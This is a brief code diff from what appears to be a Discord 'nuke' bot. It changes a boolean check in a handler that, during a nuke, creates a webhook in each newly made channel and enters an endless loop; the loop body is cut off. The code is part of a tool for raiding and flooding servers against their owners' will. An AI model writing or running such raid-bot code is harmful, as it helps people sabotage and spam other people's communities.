@@ -141,7 +141,7 @@ async def nuke(ctx):
 @adxtrz.event
 async def on_guild_channel_create(channel):
   global nuke
-  if nuke == True:
+  if nuke:
       webhook=await channel.create_webhook(name=whname)
       try:
           while True:
